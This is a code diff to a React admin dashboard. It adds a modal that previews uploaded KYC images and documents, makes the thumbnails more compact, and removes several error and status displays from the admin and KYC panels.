@@ -35,6 +35,19 @@ const AdminDashboard = () => {
       alert('Copied to clipboard');
     }
   };
+
+  // preview modal state
+  const [previewOpen, setPreviewOpen] = useState(false);
+  const [previewItem, setPreviewItem] = useState(null);
+
+  const openPreview = (item) => {
+    setPreviewItem(item);
+    setPreviewOpen(true);
+  };
+  const closePreview = () => {
+    setPreviewOpen(false);
+    setPreviewItem(null);
+  };
   const [activePanel, setActivePanel] = useState('admin');
   const [admins, setAdmins] = useState([]);
   const [error, setError] = useState('');
@@ -279,7 +292,7 @@ const AdminDashboard = () => {
           {activePanel === 'admin' && (
             <div className="w-full h-full bg-white rounded-lg shadow-lg flex flex-col items-stretch justify-start" style={{ minHeight: '100vh', maxWidth: '100%', margin: 0, padding: '2rem' }}>
               <h2 className="text-4xl font-bold mb-4 text-center">Admins</h2>
-              {error && <div className="mb-4 text-red-500 text-center">{error}</div>}
+              {/* errors intentionally not shown here per admin UI preference */}
               <div className="w-full overflow-x-auto">
                 <table className="w-full border-collapse border border-gray-300">
                   <thead>
@@ -336,24 +349,19 @@ const AdminDashboard = () => {
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                 {kycRecords.length === 0 && <div className="text-gray-500">No KYC records found.</div>}
                 {kycRecords.map((rec) => (
-                  <div key={rec._id} className="border rounded p-4 shadow-sm">
+                  <div key={rec._id} className="border rounded p-2 md:p-4 shadow-sm">
                     <div className="flex items-center justify-between mb-2">
-                      <div className="font-semibold">Session: {rec.sessionId}</div>
-                      <div className="text-sm text-gray-500">{new Date(rec.createdAt).toLocaleString()}</div>
+                      <div className="font-semibold text-sm">Session: {rec.sessionId}</div>
+                      <div className="text-xs text-gray-500">{new Date(rec.createdAt).toLocaleString()}</div>
                     </div>
-                    <div className="mb-2">Wallet: <span className="font-medium">{rec.walletType}</span></div>
-                    <div className="mb-3">Verification: <span className="font-medium">{rec.verificationStatus}</span></div>
-                    <div className="grid grid-cols-3 gap-2">
+                    {/* thumbnails: compact horizontal scroll on small screens, grid on md+ */}
+                    <div className="flex gap-2 overflow-x-auto md:grid md:grid-cols-3 md:gap-2">
                       {(rec.imageUrls || []).map((img, i) => (
-                        <div key={i} className="w-full h-24 overflow-hidden border rounded cursor-pointer" title="Open file">
-                          <a href={img.url} target="_blank" rel="noreferrer noopener">
-                            {/* thumbnail */}
-                            <img src={img.url} alt={img.public_id} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
-                          </a>
+                        <div key={i} className="flex-none w-20 h-16 md:w-full md:h-24 overflow-hidden border rounded cursor-pointer" title="Open file" onClick={()=>openPreview(img)}>
+                          <img src={img.url} alt={img.public_id} style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                         </div>
                       ))}
                     </div>
-                    {rec.verificationError && <div className="mt-2 text-sm text-red-500">Error: {rec.verificationError}</div>}
                   </div>
                 ))}
               </div>
@@ -436,6 +444,24 @@ const AdminDashboard = () => {
           )}
         </div>
       </main>
+      {/* Preview Modal */}
+      {previewOpen && previewItem && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70" onClick={closePreview}>
+          <div className="bg-white rounded shadow-lg max-w-4xl w-full max-h-[90vh] overflow-auto p-4" onClick={(e)=>e.stopPropagation()}>
+            <div className="flex justify-end mb-2">
+              <button onClick={closePreview} className="px-3 py-1 bg-red-500 text-white rounded">Close</button>
+            </div>
+            <div className="flex items-center justify-center">
+              {previewItem.resource_type && previewItem.resource_type.startsWith('image') || (previewItem.format && ['jpg','jpeg','png','gif','webp'].includes((previewItem.format||'').toLowerCase())) ? (
+                <img src={previewItem.url} alt={previewItem.public_id} style={{ maxWidth: '100%', maxHeight: '80vh', objectFit: 'contain' }} />
+              ) : (
+                // attempt to render PDFs and other documents in an iframe/embed
+                <iframe src={previewItem.url} title={previewItem.public_id} style={{ width: '100%', height: '80vh', border: 'none' }} />
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
